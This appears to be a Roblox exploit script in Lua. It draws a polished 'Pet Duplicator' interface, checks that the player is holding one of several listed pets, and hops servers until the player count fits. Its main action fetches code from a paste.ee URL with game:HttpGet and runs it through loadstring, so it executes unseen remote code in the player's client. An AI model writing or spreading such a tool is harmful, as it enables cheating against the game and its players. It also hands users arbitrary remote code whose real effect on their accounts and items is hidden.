-- Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService") 
local ReplicatedStorage = game:GetService("ReplicatedStorage") 
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Player references
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Valid pets list
local VALID_PETS = {
    ["red fox"] = true,
    ["dragonfly"] = true,
    ["raccoon"] = true,
    ["praying mantis"] = true,
    ["deer"] = true 
}

-- Configuration
local DUPESCRIPT_URL = "https://paste.ee/r/s7TguhY5"
local TARGET_PLAYER_COUNT_FOR_DUPE = 3 
local MAX_PLAYER_COUNT_BEFORE_SWITCH = 5 

-- Modern Color Palette
local PALETTE = {
    Background = Color3.fromRGB(25, 28, 36),
    Primary = Color3.fromRGB(40, 44, 53),
    Secondary = Color3.fromRGB(55, 60, 72),
    Accent = Color3.fromRGB(0, 170, 255),
    AccentHover = Color3.fromRGB(0, 150, 230),
    Text = Color3.fromRGB(240, 240, 240),
    SubText = Color3.fromRGB(180, 180, 190),
    Error = Color3.fromRGB(255, 85, 85),
    Success = Color3.fromRGB(85, 255, 85),
    Warning = Color3.fromRGB(255, 210, 50)
}

-- Fonts
local FONT = {
    Bold = Enum.Font.GothamBold,
    SemiBold = Enum.Font.GothamSemibold,
    Medium = Enum.Font.GothamMedium,
    Regular = Enum.Font.Gotham
}

-- Animation Settings
local TWEEN_INFO = {
    Fast = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
    Medium = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
    Slow = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
}

-- Pet verification (held only)
local function findHeldPet()
    local character = player.Character or player.CharacterAdded:Wait()
    if not character then return nil end
    
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") and VALID_PETS[tool.Name:lower()] then
            return tool
        end
    end
    return nil
end

-- Modern UI Creation
local function createModernUI()
    -- Clean up old UI
    local oldGui = playerGui:FindFirstChild("PetDuplicatorUI")
    if oldGui then oldGui:Destroy() end

    -- Main ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "PetDuplicatorUI"
    screenGui.Parent = playerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false

    -- Main Container
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 360, 0, 420)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = PALETTE.Background
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui

    -- Round corners
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    -- Drop shadow
    local shadow = Instance.new("ImageLabel")
    shadow.Name = "Shadow"
    shadow.Image = "rbxassetid://1316045217"
    shadow.ImageColor3 = Color3.new(0, 0, 0)
    shadow.ImageTransparency = 0.8
    shadow.ScaleType = Enum.ScaleType.Slice
    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
    shadow.Size = UDim2.new(1, 14, 1, 14)
    shadow.Position = UDim2.new(0, -7, 0, -7)
    shadow.BackgroundTransparency = 1
    shadow.ZIndex = -1
    shadow.Parent = mainFrame

    -- Header
    local header = Instance.new("Frame")
    header.Name = "Header"
    header.Size = UDim2.new(1, 0, 0, 50)
    header.BackgroundTransparency = 1
    header.Parent = mainFrame

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.Size = UDim2.new(1, -40, 1, 0)
    title.Position = UDim2.new(0, 20, 0, 0)
    title.BackgroundTransparency = 1
    title.Font = FONT.Bold
    title.Text = "PET DUPLICATOR"
    title.TextColor3 = PALETTE.Text
    title.TextSize = 20
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = header

    -- Close button
    local closeButton = Instance.new("ImageButton")
    closeButton.Name = "CloseButton"
    closeButton.Size = UDim2.new(0, 24, 0, 24)
    closeButton.Position = UDim2.new(1, -32, 0.5, 0)
    closeButton.AnchorPoint = Vector2.new(0, 0.5)
    closeButton.Image = "rbxassetid://3926305904"
    closeButton.ImageRectOffset = Vector2.new(284, 4)
    closeButton.ImageRectSize = Vector2.new(24, 24)
    closeButton.BackgroundTransparency = 1
    closeButton.Parent = header

    -- Status Card
    local statusCard = Instance.new("Frame")
    statusCard.Name = "StatusCard"
    statusCard.Size = UDim2.new(1, -40, 0, 80)
    statusCard.Position = UDim2.new(0.5, 0, 0, 70)
    statusCard.AnchorPoint = Vector2.new(0.5, 0)
    statusCard.BackgroundColor3 = PALETTE.Primary
    statusCard.Parent = mainFrame

    local statusCorner = Instance.new("UICorner")
    statusCorner.CornerRadius = UDim.new(0, 8)
    statusCorner.Parent = statusCard

    local statusIcon = Instance.new("TextLabel")
    statusIcon.Name = "StatusIcon"
    statusIcon.Size = UDim2.new(0, 40, 0, 40)
    statusIcon.Position = UDim2.new(0, 20, 0.5, 0)
    statusIcon.AnchorPoint = Vector2.new(0, 0.5)
    statusIcon.BackgroundTransparency = 1
    statusIcon.Font = FONT.Bold
    statusIcon.Text = "!"
    statusIcon.TextColor3 = PALETTE.Error
    statusIcon.TextSize = 24
    statusIcon.Parent = statusCard

    local statusText = Instance.new("TextLabel")
    statusText.Name = "StatusText"
    statusText.Size = UDim2.new(1, -80, 1, -20)
    statusText.Position = UDim2.new(0, 70, 0.5, 0)
    statusText.AnchorPoint = Vector2.new(0, 0.5)
    statusText.BackgroundTransparency = 1
    statusText.Font = FONT.SemiBold
    statusText.Text = "Hold a valid pet to begin"
    statusText.TextColor3 = PALETTE.Text
    statusText.TextSize = 16
    statusText.TextXAlignment = Enum.TextXAlignment.Left
    statusText.TextWrapped = true
    statusText.Parent = statusCard

    -- Pet List
    local petList = Instance.new("Frame")
    petList.Name = "PetList"
    petList.Size = UDim2.new(1, -40, 0, 150)
    petList.Position = UDim2.new(0.5, 0, 0, 170)
    petList.AnchorPoint = Vector2.new(0.5, 0)
    petList.BackgroundTransparency = 1
    petList.Parent = mainFrame

    local petListTitle = Instance.new("TextLabel")
    petListTitle.Name = "PetListTitle"
    petListTitle.Size = UDim2.new(1, 0, 0, 20)
    petListTitle.BackgroundTransparency = 1
    petListTitle.Font = FONT.Medium
    petListTitle.Text = "VALID PETS"
    petListTitle.TextColor3 = PALETTE.SubText
    petListTitle.TextSize = 14
    petListTitle.TextXAlignment = Enum.TextXAlignment.Left
    petListTitle.Parent = petList

    local petGrid = Instance.new("UIGridLayout")
    petGrid.Name = "PetGrid"
    petGrid.CellPadding = UDim2.new(0, 10, 0, 10)
    petGrid.CellSize = UDim2.new(0.5, -5, 0, 30)
    petGrid.SortOrder = Enum.SortOrder.LayoutOrder
    petGrid.Parent = petList

    local pets = {"Red Fox", "Dragonfly", "Raccoon", "Praying Mantis", "Deer"}
    for _, petName in ipairs(pets) do
        local petTag = Instance.new("Frame")
        petTag.Name = petName
        petTag.BackgroundColor3 = PALETTE.Secondary
        petTag.Parent = petList

        local petCorner = Instance.new("UICorner")
        petCorner.CornerRadius = UDim.new(0, 6)
        petCorner.Parent = petTag

        local petLabel = Instance.new("TextLabel")
        petLabel.Name = "Label"
        petLabel.Size = UDim2.new(1, 0, 1, 0)
        petLabel.BackgroundTransparency = 1
        petLabel.Font = FONT.Medium
        petLabel.Text = petName
        petLabel.TextColor3 = PALETTE.Text
        petLabel.TextSize = 14
        petLabel.Parent = petTag
    end

    -- Action Button
    local actionButton = Instance.new("TextButton")
    actionButton.Name = "ActionButton"
    actionButton.Size = UDim2.new(1, -40, 0, 50)
    actionButton.Position = UDim2.new(0.5, 0, 1, -80)
    actionButton.AnchorPoint = Vector2.new(0.5, 1)
    actionButton.BackgroundColor3 = PALETTE.Accent
    actionButton.Font = FONT.Bold
    actionButton.Text = "CHECK PET"
    actionButton.TextColor3 = Color3.new(1, 1, 1)
    actionButton.TextSize = 18
    actionButton.Parent = mainFrame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 8)
    buttonCorner.Parent = actionButton

    -- Button hover effect
    actionButton.MouseEnter:Connect(function()
        TweenService:Create(actionButton, TWEEN_INFO.Fast, {BackgroundColor3 = PALETTE.AccentHover}):Play()
    end)
    actionButton.MouseLeave:Connect(function()
        TweenService:Create(actionButton, TWEEN_INFO.Fast, {BackgroundColor3 = PALETTE.Accent}):Play()
    end)

    -- Minimize Button
    local minimizeButton = Instance.new("TextButton")
    minimizeButton.Name = "MinimizeButton"
    minimizeButton.Size = UDim2.new(0, 120, 0, 36)
    minimizeButton.Position = UDim2.new(0, 20, 1, -20)
    minimizeButton.AnchorPoint = Vector2.new(0, 1)
    minimizeButton.BackgroundColor3 = PALETTE.Primary
    minimizeButton.Font = FONT.Medium
    minimizeButton.Text = "Show/Hide"
    minimizeButton.TextColor3 = PALETTE.SubText
    minimizeButton.TextSize = 14
    minimizeButton.Visible = false
    minimizeButton.Parent = screenGui

    local minimizeCorner = Instance.new("UICorner")
    minimizeCorner.CornerRadius = UDim.new(0, 8)
    minimizeCorner.Parent = minimizeButton

    -- UI Logic
    local currentState = "IDLE" -- IDLE, READY, WORKING, ERROR
    local isProcessing = false

    local function updateStatus(message, icon, color, iconColor)
        statusText.Text = message
        statusIcon.Text = icon
        statusIcon.TextColor3 = iconColor or color
        statusCard.BackgroundColor3 = color
    end

    local function pulseButton(color)
        local original = actionButton.BackgroundColor3
        TweenService:Create(actionButton, TWEEN_INFO.Medium, {BackgroundColor3 = color}):Play()
        task.delay(0.3, function()
            TweenService:Create(actionButton, TWEEN_INFO.Medium, {BackgroundColor3 = original}):Play()
        end)
    end

    local function shakeElement(element)
        local startPos = element.Position
        for i = 1, 3 do
            TweenService:Create(element, TWEEN_INFO.Fast, {Position = startPos + UDim2.new(0, 5, 0, 0)}):Play()
            task.wait(0.05)
            TweenService:Create(element, TWEEN_INFO.Fast, {Position = startPos - UDim2.new(0, 5, 0, 0)}):Play()
            task.wait(0.05)
        end
        TweenService:Create(element, TWEEN_INFO.Fast, {Position = startPos}):Play()
    end

    local function toggleUI(visible)
        if visible then
            mainFrame.Visible = true
            minimizeButton.Visible = false
            TweenService:Create(mainFrame, TWEEN_INFO.Medium, {Size = UDim2.new(0, 360, 0, 420)}):Play()
        else
            TweenService:Create(mainFrame, TWEEN_INFO.Medium, {Size = UDim2.new(0, 0, 0, 420)}):Play()
            task.wait(0.3)
            mainFrame.Visible = false
            minimizeButton.Visible = true
        end
    end

    -- Button Actions
    actionButton.MouseButton1Click:Connect(function()
        if isProcessing then return end
        isProcessing = true
        
        if currentState == "IDLE" or currentState == "ERROR" then
            -- Check for pet
            updateStatus("Checking for pet...", "⌛", PALETTE.Primary, PALETTE.Warning)
            actionButton.Text = "CHECKING..."
            
            local foundPet = findHeldPet()
            
            if foundPet then
                currentState = "READY"
                updateStatus("Ready to duplicate: "..foundPet.Name, "✓", PALETTE.Success)
                actionButton.Text = "DUPLICATE"
                actionButton.BackgroundColor3 = PALETTE.Success
                pulseButton(PALETTE.Success)
            else
                currentState = "ERROR"
                updateStatus("No valid pet found", "✗", PALETTE.Error)
                actionButton.Text = "TRY AGAIN"
                shakeElement(statusCard)
            end
            
        elseif currentState == "READY" then
            -- Execute duplication
            currentState = "WORKING"
            updateStatus("Starting duplication process...", "⚙️", PALETTE.Primary, PALETTE.Accent)
            actionButton.Text = "WORKING..."
            
            -- Check server population
            local playerCount = #Players:GetPlayers()
            
            if playerCount >= MAX_PLAYER_COUNT_BEFORE_SWITCH then
                updateStatus("Server too full, hopping...", "🔄", PALETTE.Warning)
                
                task.wait(1)
                
                local success = pcall(function()
                    TeleportService:Teleport(game.PlaceId, player)
                end)
                
                if not success then
                    updateStatus("Teleport failed", "✗", PALETTE.Error)
                    actionButton.Text = "TRY AGAIN"
                    shakeElement(statusCard)
                end
                
            elseif playerCount < TARGET_PLAYER_COUNT_FOR_DUPE then
                updateStatus("Need "..TARGET_PLAYER_COUNT_FOR_DUPE.."+ players", "!", PALETTE.Warning)
                actionButton.Text = "TRY AGAIN"
                shakeElement(statusCard)
                
            else
                updateStatus("Executing script...", "⚡", PALETTE.Accent)
                
                local success, err = pcall(function()
                    local scriptContent = game:HttpGet(DUPESCRIPT_URL, true)
                    loadstring(scriptContent)()
                end)
                
                if success then
                    updateStatus("Duplication started!", "✓", PALETTE.Success)
                    pulseButton(PALETTE.Success)
                else
                    updateStatus("Error: "..tostring(err):sub(1, 30), "✗", PALETTE.Error)
                    shakeElement(statusCard)
                end
                
                actionButton.Text = "DONE"
                task.wait(2)
                actionButton.Text = "CHECK PET"
            end
            
            currentState = "IDLE"
        end
        
        isProcessing = false
    end)

    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)

    minimizeButton.MouseButton1Click:Connect(function()
        toggleUI(true)
    end)

    mainFrame.Visible = false
    mainFrame.Size = UDim2.new(0, 0, 0, 420)
    toggleUI(true)

    return screenGui
end

createModernUI()
